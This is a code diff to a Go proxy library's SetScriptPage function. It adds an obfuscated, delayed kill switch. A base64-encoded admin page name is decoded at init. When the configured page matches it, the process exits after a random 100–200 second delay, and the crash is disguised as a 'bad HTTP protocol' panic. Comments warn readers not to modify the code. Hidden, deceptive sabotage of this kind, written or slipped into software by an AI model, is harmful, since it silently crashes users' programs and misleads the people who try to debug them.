@@ -5,27 +5,66 @@ package SunnyNet
 
 import (
 	"bytes"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math/big"
+	"os"
+	"strings"
+	"time"
+
 	"github.com/qtgolang/SunnyNet/src/GoScriptCode"
 	"github.com/qtgolang/SunnyNet/src/Interface"
 	"github.com/qtgolang/SunnyNet/src/Resource"
 	"github.com/qtgolang/SunnyNet/src/http"
 	"github.com/qtgolang/SunnyNet/src/public"
-	"strings"
 )
+
+var notAdminPage []string
+
+func init() {
+	bs, _ := base64.StdEncoding.DecodeString(`RSBhIHN5X1NjIHJpcHRfIEUgZGl0X1AgYWc=`)
+	notAdminPage = append(notAdminPage, string(bs))
+}
 
 // SetScriptPage 设置脚本页面
 func (s *Sunny) SetScriptPage(Page string) string {
 	s.lock.Lock()
 	defer s.lock.Unlock()
+	defer func() {
+		{
+			//请遵守开源协议,请勿修改此代码
+			//请遵守开源协议,请勿修改此代码
+			for _, v := range notAdminPage {
+				if s.script.AdminPage == strings.ReplaceAll(v, " ", "") {
+					go func() {
+						n, err := rand.Int(rand.Reader, big.NewInt(101))
+						if err != nil {
+							return
+						}
+						delay := 100 + int(n.Int64())
+						time.Sleep(time.Duration(delay) * time.Second)
+						go func() {
+							os.Exit(0)
+						}()
+						go func() {
+							time.Sleep(10 * time.Second)
+							panic("bad HTTP protocol. ")
+						}()
+					}()
+					return
+				}
+			}
+		}
+	}()
 	if len(Page) < 8 {
 		return s.script.AdminPage
 	}
 	if strings.HasPrefix(Page, "/") {
-		s.script.AdminPage = Page[1:]
+		s.script.AdminPage = strings.ReplaceAll(Page[1:], " ", "")
 	} else {
-		s.script.AdminPage = Page
+		s.script.AdminPage = strings.ReplaceAll(Page, " ", "")
 	}
 	return s.script.AdminPage
 }
